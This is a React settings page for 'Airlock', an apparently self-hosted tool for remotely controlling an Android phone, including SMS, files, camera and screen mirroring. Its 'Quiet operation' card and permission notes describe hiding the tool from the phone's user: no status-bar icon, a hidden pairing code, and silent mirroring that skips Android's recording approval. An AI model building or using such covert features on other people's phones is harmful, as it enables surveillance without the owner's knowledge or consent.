import React from 'react';
import { Card, Icon, Pill } from '../components/ui';
import type { Link, DeviceInfo, Stats, Connection } from '../lib/link';
import type { Toast } from '../App';
import { formatBytes, formatUptime } from '../lib/util';

type PermKey = keyof NonNullable<DeviceInfo['permissions']>;

const PERMISSIONS: Array<{ name: string; perm: string; rpc: string; key?: PermKey; open?: string }> = [
  { name: 'Remote control', perm: 'AccessibilityService', rpc: 'input.tap / swipe / text / key', key: 'accessibility', open: 'accessibility' },
  { name: 'Notifications', perm: 'NotificationListenerService', rpc: 'notif.list / reply / dismiss', key: 'notifications', open: 'notification_access' },
  { name: 'Files', perm: 'MANAGE_EXTERNAL_STORAGE', rpc: 'fs.list / download / upload', key: 'allFiles', open: 'storage' },
  { name: 'SMS', perm: 'READ_SMS, SEND_SMS', rpc: 'sms.threads / messages / send', key: 'smsRead', open: 'sms' },
  { name: 'Camera', perm: 'CAMERA + foregroundServiceType=camera', rpc: 'camera.shot', key: 'camera', open: 'camera' },
  { name: 'Always online', perm: 'Battery optimisation exemption', rpc: 'push link', key: 'battery', open: 'battery' },
  { name: 'Screen mirror', perm: 'Accessibility screenshots (silent) or MediaProjection', rpc: 'mirror.start', key: 'screenshot', open: 'accessibility' },
  { name: 'Clipboard', perm: 'Android 10+ blocks background clipboard read', rpc: 'device.action clipboard.*' },
];

export function Settings({
  link, device, stats, last, onDisconnect, toast,
}: {
  link: Link;
  device: DeviceInfo | null;
  stats: Stats;
  last: Connection | null;
  onDisconnect: () => void;
  toast: (t: string, tone?: Toast['tone']) => void;
}) {
  const maskedToken = last?.token ? `${last.token.slice(0, 4)}…${last.token.slice(-4)}` : '—';

  async function copy(text: string) {
    try { await navigator.clipboard.writeText(text); toast('copied', 'ok'); } catch { toast('clipboard blocked', 'bad'); }
  }

  return (
    <div className="page">
      <div className="page-head">
        <div>
          <h1>Settings</h1>
          <p>Everything about this link, what the device grants, and how to self-host it.</p>
        </div>
        <div className="spacer" />
        <button className="btn btn-danger btn-sm" onClick={onDisconnect}><Icon name="logout" size={14} /> Disconnect</button>
      </div>

      <div className="settings-grid">
        <Card title="Connection">
          <div className="kv"><span>Mode</span><span>{last?.mode || '—'}</span></div>
          <div className="kv"><span>Label</span><span className="truncate" style={{ maxWidth: 220 }}>{last?.label || '—'}</span></div>
          <div className="kv"><span>Socket</span><span className="truncate" style={{ maxWidth: 220 }}>{last?.url?.replace(/token=[^&]+/, 'token=***') || '—'}</span></div>
          {last?.relay && <div className="kv"><span>Relay</span><span className="truncate" style={{ maxWidth: 220 }}>{last.relay}</span></div>}
          {last?.room && <div className="kv"><span>Room</span><span>{maskedToken}</span></div>}
          <div className="kv"><span>Transport</span><span>{last?.url?.startsWith('wss') ? 'TLS WebSocket' : 'plain WebSocket (LAN)'}</span></div>
          <div className="kv"><span>Device</span><span>{device?.name || '—'}</span></div>
          <div className="kv"><span>Device ID</span><span>{device?.id || '—'}</span></div>
          <div className="kv"><span>Agent</span><span>{device?.agent || '—'}</span></div>
          <div className="kv"><span>Battery / uptime</span><span>{stats.battery ?? '—'}% · {formatUptime(stats.uptime)}</span></div>
        </Card>

        <Card title="Self-host it">
          <p className="muted" style={{ marginTop: 0, fontSize: 12.5 }}>
            Three pieces, all free tier: a static dashboard (Vercel), a WebSocket relay
            (Render / Deno Deploy / Fly) and, optionally, Supabase for accounts and history.
          </p>
          <div className="codeblock">
            <span className="k">git clone</span> &lt;your fork&gt; airlock && <span className="k">cd</span> airlock{'\n'}
            <span className="k">npm</span> install{'\n'}
            <span className="k">npm</span> run relay   <span className="k">#</span> ws://localhost:8788{'\n'}
            <span className="k">npm</span> run agent   <span className="k">#</span> demo device, code 123456{'\n'}
            <span className="k">npm</span> run web     <span className="k">#</span> dashboard on :5173
          </div>
          <div className="row mt-16">
            <button className="btn btn-sm" onClick={() => copy('npm install && npm run relay & npm run agent & npm run web')}>
              <Icon name="clipboard" size={14} /> Copy commands
            </button>
            <a className="btn btn-sm" href="https://vercel.com/new" target="_blank" rel="noreferrer">
              <Icon name="cloud" size={14} /> Deploy on Vercel
            </a>
          </div>
          <p className="faint" style={{ fontSize: 11.5, marginBottom: 0 }}>
            The Vercel build is fully static — no server functions, no database, no secrets in
            the bundle.
          </p>
        </Card>

        <Card title="Quiet operation">
          <div className="kv">
            <span>Silent mode on phone</span>
            <span>{device?.silent === undefined ? '—' : device.silent ? 'on' : 'off'}</span>
          </div>
          <p className="muted" style={{ margin: '8px 0 12px', fontSize: 12 }}>
            When on, volume changes draw no panel, input errors stay off the phone screen, the link
            notification loses its status-bar icon and hides the pairing code and IP on the lock screen.
            With Accessibility enabled, mirroring is silent too — no “Start recording?” approval.
          </p>
          <button
            className="btn btn-sm"
            disabled={!device}
            onClick={async () => {
              try {
                const res = await link.request<any>('device.action', {
                  action: device?.silent ? 'silent.off' : 'silent.on',
                });
                toast(res?.silent ? 'silent mode is on' : 'silent mode is off', 'ok');
              } catch (e: any) {
                toast(e?.message || 'could not change silent mode', 'bad');
              }
            }}
          >
            <Icon name="shield" size={14} /> {device?.silent ? 'Leave silent mode' : 'Enter silent mode'}
          </button>
        </Card>

        <Card title="Device permissions">
          {PERMISSIONS.map((p) => {
            const state = p.key ? device?.permissions?.[p.key] : undefined;
            const denied = state === false;
            const target = p.open;
            return (
              <div className={`perm${denied ? '' : ' ok'}`} key={p.name} style={{ marginBottom: 7 }}>
                <Icon name={denied ? 'warning' : 'check'} size={14} />
                <div style={{ minWidth: 0 }}>
                  <div style={{ fontSize: 12.5, fontWeight: 550 }}>{p.name}</div>
                  <div className="faint" style={{ fontSize: 11 }}>{p.perm}</div>
                </div>
                {denied && target ? (
                  <button
                    className="btn btn-sm"
                    style={{ marginLeft: 'auto' }}
                    onClick={async () => {
                      try {
                        await link.request('device.permission', { permission: target });
                        toast('settings opened on the phone', 'ok');
                      } catch (e: any) {
                        toast(e?.message || 'open Airlock → Permissions on the phone', 'warn');
                      }
                    }}
                  >
                    grant
                  </button>
                ) : (
                  <span className="mono faint" style={{ marginLeft: 'auto', fontSize: 10.5, textAlign: 'right' }}>{p.rpc}</span>
                )}
              </div>
            );
          })}
          <p className="faint" style={{ fontSize: 11.5, marginBottom: 0 }}>
            Android requires a foreground-service entry for the link. In silent mode it is a
            minimum-importance shade line with no status-bar icon; denying Notifications on
            Android 13+ hides it entirely without stopping the agent.
          </p>
        </Card>

        <Card title="Security model">
          <div className="timeline">
            <div className="rail" />
            <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
              <div>
                <b style={{ fontSize: 12.5 }}>Pairing</b>
                <p className="muted" style={{ margin: '2px 0 0', fontSize: 12 }}>
                  A six-digit code is bound to one room and expires after 10 minutes. The
                  relay only exchanges it for a 32-byte room token.
                </p>
              </div>
              <div>
                <b style={{ fontSize: 12.5 }}>Transport</b>
                <p className="muted" style={{ margin: '2px 0 0', fontSize: 12 }}>
                  Always prefer <code>wss://</code>. LAN mode is plaintext WebSocket inside
                  your own network; the agent refuses files outside its sandbox.
                </p>
              </div>
              <div>
                <b style={{ fontSize: 12.5 }}>What the relay sees</b>
                <p className="muted" style={{ margin: '2px 0 0', fontSize: 12 }}>
                  Room id, role, frame sizes and timing. Not filenames, not SMS, not screen
                  content — unless TLS is terminated at the relay and you operate it.
                </p>
              </div>
              <div>
                <b style={{ fontSize: 12.5 }}>Roadmap: E2E</b>
                <p className="muted" style={{ margin: '2px 0 0', fontSize: 12 }}>
                  Derive an AES-256-GCM key from the pairing code (PBKDF2-SHA256, 200k
                  iterations, room salt) and encrypt every envelope. The protocol reserves
                  the <code>flags</code> byte for this.
                </p>
              </div>
            </div>
          </div>
          <div className="row mt-16">
            <Pill tone="ok"><Icon name="shield" size={12} /> no telemetry</Pill>
            <Pill tone="muted">no ads</Pill>
            <Pill tone="info">MIT</Pill>
          </div>
        </Card>

        <Card title="Protocol">
          <p className="muted" style={{ marginTop: 0, fontSize: 12.5 }}>
            Every action is one JSON envelope; media and files are 16-byte-header binary
            frames. Full reference in <span className="mono">docs/PROTOCOL.md</span>.
          </p>
          <div className="codeblock">
            {'→ {"type":"fs.list","data":{"path":"/"}}\n'}
            {'← {"type":"res:fs.list","ok":true,\n'}
            {'   "data":{"entries":[{"name":"Photos","dir":true}]}}\n\n'}
            {'→ {"type":"mirror.start","data":{"fps":10}}\n'}
            {'← [binary] kind=1 codec=3 jpeg/webp/svg bytes…\n'}
          </div>
          <div className="kv mt-16"><span>Free space</span><span>{formatBytes(stats.storage?.free)}</span></div>
          <div className="kv"><span>Memory</span><span>{stats.mem ? `${formatBytes(stats.mem.total - stats.mem.free)} / ${formatBytes(stats.mem.total)}` : '—'}</span></div>
          <div className="kv"><span>Link state</span><span>{link.status}</span></div>
        </Card>

        <Card title="About">
          <p className="muted" style={{ marginTop: 0, fontSize: 12.5 }}>
            Airlock is a clean-room reimplementation of the AirDroid feature set built
            for free-tier hosting. It shares no code, assets or protocol with AirDroid.
            Do not use it to access devices you do not own.
          </p>
          <div className="kv"><span>Dashboard</span><span>1.0.4</span></div>
          <div className="kv"><span>Protocol</span><span>1</span></div>
          <div className="kv"><span>License</span><span>MIT</span></div>
          <div className="row mt-16">
            <button className="btn btn-sm" onClick={() => copy('https://github.com/storytold/craft-anything')}>
              <Icon name="link" size={14} /> Research notes
            </button>
            <button className="btn btn-sm" onClick={() => location.reload()}>
              <Icon name="refresh" size={14} /> Reload
            </button>
          </div>
        </Card>
      </div>
    </div>
  );
}
